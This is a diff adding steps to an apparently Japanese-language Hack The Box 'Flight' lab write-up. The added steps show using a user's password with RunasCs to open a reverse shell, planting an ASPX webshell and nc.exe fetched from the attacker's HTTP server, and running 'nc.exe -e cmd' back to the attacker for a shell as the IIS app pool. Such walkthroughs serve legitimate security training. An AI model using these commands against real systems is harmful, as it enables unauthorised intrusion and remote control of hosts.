@@ -656,9 +656,14 @@ kaliのchiselサーバ上での接続確認
 2025/10/15 09:09:23 server: session#1: tun: proxy#R:8888=>8000: Listening
 ```
 今度は8000番のwebサイトを確認できた  
-<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Flight_05.png">  
-適当にファイルにアクセス、エラー内にフォルダパスを確認
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Flight_05.png">
+
+
+## STEP 7
+適当にファイルにアクセスすると、エラー画面内にweb用と思われるフォルダパスを確認
 <img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Flight_06.png">  
+このフォルダはユーザc.bumがwrite権限あり  
+ユーザc.bumでaspx形式のwebshellを書き込みできそう
 ```sh
 C:\xampp\htdocs\school.flight.htb>icacls C:\inetpub\development
 C:\inetpub\development flight\C.Bum:(OI)(CI)(W)
@@ -671,4 +676,103 @@ C:\inetpub\development flight\C.Bum:(OI)(CI)(W)
                        BUILTIN\Users:(I)(RX)
                        BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                        CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+```
+smb経由でC:\inetpub\developmentにアクセスできないため、c.bumのシェル上でC:\inetpub\developmentにアクセスする必要がある  
+c.bumのクレデンシャルは所持しているため、RunasCsでリバースシェルを取得する
+```sh
+└─$ wget -nv https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip                                          
+2025-10-16 03:46:10 URL:https://release-assets.githubusercontent.com/github-production-release-asset/201331135/46cefc59-1a1e-4e32-8b47-864a11159984?sp=r&sv=2018-11-09&sr=b&spr=https&se=2025-10-16T08%3A27%3A59Z&rscd=attachment%3B+filename%3DRunasCs.zip&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2025-10-16T07%3A27%3A14Z&ske=2025-10-16T08%3A27%3A59Z&sks=b&skv=2018-11-09&sig=II3lLp0t5uK0KgQR6NfXvdW3FCTrn6XIS%2FLC9DGxSOU%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc2MDYwMTM3NywibmJmIjoxNzYwNjAxMDc3LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.LiL0b6z-qR9KnqRSZLb621UHDauY6OX9sGYsG_ucLwc&response-content-disposition=attachment%3B%20filename%3DRunasCs.zip&response-content-type=application%2Foctet-stream [39889/39889] -> "RunasCs.zip" [1]
+                                                                                                                                                                       
+└─$ unzip RunasCs.zip 
+Archive:  RunasCs.zip
+  inflating: RunasCs.exe             
+  inflating: RunasCs_net2.exe
+```
+RunasCsをsmb経由で配送
+```sh
+└─$ netexec smb 10.129.200.222 -u 'flight.htb\c.bum' -p 'Tikkycoll_431012284' --share web --put-file '/home/kali/RunasCs.exe' '/school.flight.htb/RunasCs.exe'
+SMB         10.129.200.222  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) 
+SMB         10.129.200.222  445    G0               [+] flight.htb\c.bum:Tikkycoll_431012284 
+SMB         10.129.200.222  445    G0               [*] Copying /home/kali/RunasCs.exe to /school.flight.htb/RunasCs.exe
+SMB         10.129.200.222  445    G0               [+] Created file /home/kali/RunasCs.exe on \\web\/school.flight.htb/RunasCs.exe
+```
+RunasCs実行
+```powershell
+C:\xampp\htdocs\school.flight.htb>.\RunasCs.exe C.Bum Tikkycoll_431012284 cmd -r 10.10.16.6:5555
+[*] Warning: The logon for user 'C.Bum' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-72b99$\Default
+[+] Async process 'C:\Windows\system32\cmd.exe' with pid 2956 created in background.
+```
+c.bumのリバースシェル取得
+```sh
+└─$ rlwrap nc -lnvp 5555
+listening on [any] 5555 ...
+connect to [10.10.16.6] from (UNKNOWN) [10.129.228.120] 51044
+Microsoft Windows [Version 10.0.17763.2989]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+flight\c.bum
+```
+配送するaspx形式のwebshellをkaliのhttpサーバにアップロード
+```sh
+└─$ cp /usr/share/webshells/aspx/cmdasp.aspx .
+
+└─$ python3.13 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+webshellをダウンロード  
+```sh
+C:\Windows\system32>cd C:\inetpub\development
+cd C:\inetpub\development
+
+C:\inetpub\development>powershell /c "Invoke-Webrequest http://10.10.16.6/cmdasp.aspx -outfile test.aspx"
+powershell /c "Invoke-Webrequest http://10.10.16.6/cmdasp.aspx -outfile webshell.aspx"
+
+C:\inetpub\development>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 1DF4-493D
+
+ Directory of C:\inetpub\development
+
+10/16/2025  08:44 AM    <DIR>          .
+10/16/2025  08:44 AM    <DIR>          ..
+10/16/2025  08:42 AM    <DIR>          development
+10/16/2025  08:44 AM             1,400 webshell.aspx
+               1 File(s)          1,400 bytes
+               3 Dir(s)   5,136,011,264 bytes free
+```
+webshellにアクセス、ああコマンドも実行確認  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Flight_07.png">  
+webshell経由でリバースシェルを取得する  
+nc.exeを配送
+```sh
+└─$ cp /usr/share/windows-resources/binaries/nc.exe .
+
+└─$ python3.13 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+```powershell
+C:\inetpub\development>powershell /c "Invoke-Webrequest http://10.10.16.6/nc.exe -outfile nc.exe"
+powershell /c "Invoke-Webrequest http://10.10.16.6/nc.exe -outfile nc.exe"
+```
+webshell上で実行
+```powershell
+cmd /c C:\inetpub\development\nc.exe -e cmd 10.10.16.6 6666
+```
+リバースシェル取得
+```powershell
+└─$ rlwrap nc -lnvp 6666
+listening on [any] 6666 ...
+connect to [10.10.16.6] from (UNKNOWN) [10.129.228.120] 52930
+Microsoft Windows [Version 10.0.17763.2989]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+c:\windows\system32\inetsrv>whoami
+whoami
+iis apppool\defaultapppool
 ```
